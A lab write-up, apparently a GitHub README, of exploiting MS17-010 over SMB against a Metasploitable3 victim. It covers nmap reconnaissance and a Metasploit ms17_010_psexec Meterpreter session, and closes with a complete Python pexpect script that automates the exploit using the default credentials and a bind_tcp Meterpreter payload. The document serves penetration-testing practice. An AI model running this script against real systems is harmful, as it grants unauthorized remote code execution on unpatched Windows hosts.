# Phase 1: SMB Exploitation (MS17-010)

In this phase, we prepared our attacker and victim environments, performed network reconnaissance, and leveraged Metasploit’s MS17-010 exploit to gain a Meterpreter session on the victim.

---

## 🔧 1. Setup & Connectivity

Starting by verifying the victim’s network configuration and confirming basic connectivity from our attacker machine.

<figure>
  <img src="https://github.com/user-attachments/assets/cca43334-a559-442a-8eb4-88bc9f4b22f2" alt="Victim machine IPv4 configuration" width="600"/>
  <figcaption><em>Victim (Metasploitable3) IPv4 configuration.</em></figcaption>
</figure>

<figure>
  <img src="https://github.com/user-attachments/assets/6fac6f6c-f931-4570-835c-a4fd2d1a0ac3" alt="Ping response from victim" width="600"/>
  <figcaption><em>Ping the victim from WSL2 to confirm reachability.</em></figcaption>
</figure>

---

## 🔍 2. Reconnaissance

Next, we ran an Nmap service and version scan against the victim to identify open ports and software versions—critical for choosing our exploit.

<figure>
  <img src="https://github.com/user-attachments/assets/bb43602a-ad0e-4e1e-a0df-13f2592c8e24" alt="Nmap service/version scan" width="600"/>
  <figcaption><em>Running <code>nmap -sV 192.168.0.14</code> to enumerate services and versions.</em></figcaption>
</figure>

---

## 🚀 3. Exploitation

With SMB (port 445) identified, we used Metasploit’s **ms17_010_psexec** module to drop a Meterpreter payload on the victim.

### 3.1 Manual Exploit

1. **Load the module & set options**  
   We specified the target host, credentials, payload, and listening port.
2. **Execute the exploit**  
   A successful run yields a Meterpreter shell.

<figure>
  <img src="https://github.com/user-attachments/assets/8d4a5dba-2f81-4d5c-86d4-5930c6d25f28" alt="Meterpreter session established" width="600"/>
  <figcaption><em>Meterpreter session established using <code>ms17_010_psexec</code>.</em></figcaption>
</figure>

We then browsed the remote filesystem to prove we had code execution:

<figure>
  <img src="https://github.com/user-attachments/assets/2697bd9d-0f3b-4c5b-8751-a8717859aa09" alt="Listing files and folders" width="600"/>
  <figcaption><em>Listing files and folders on the victim.</em></figcaption>
</figure>

Finally, we ran `ipconfig` within the Meterpreter shell to confirm the victim’s IP address:

<figure>
  <img src="https://github.com/user-attachments/assets/bb15974b-28f4-4dfd-ae2c-f143819968cb" alt="ipconfig on victim" width="600"/>
  <figcaption><em>We confirmed the victim’s IPv4 via <code>ipconfig</code>.</em></figcaption>
</figure>

---

### 3.2 Automated Exploit Script

To streamline repeated testing, we wrote a Python script using **pexpect** to drive `msfconsole` non-interactively:

```python
#!/usr/bin/env python3
import pexpect

MSF_PATH = "/usr/bin/msfconsole"
PROMPT   = r"> "    # match any trailing "> "

commands = [
    "use exploit/windows/smb/ms17_010_psexec",
    "set RHOSTS 192.168.0.14",
    "set SMBUser vagrant",
    "set SMBPass vagrant",
    "set PAYLOAD windows/x64/meterpreter/bind_tcp",
    "set LPORT 4444",
    "run"
]

child = pexpect.spawn(MSF_PATH, encoding="utf-8", timeout=120)
child.expect(PROMPT)

for cmd in commands:
    child.sendline(cmd)
    child.expect(PROMPT)

child.interact()
```
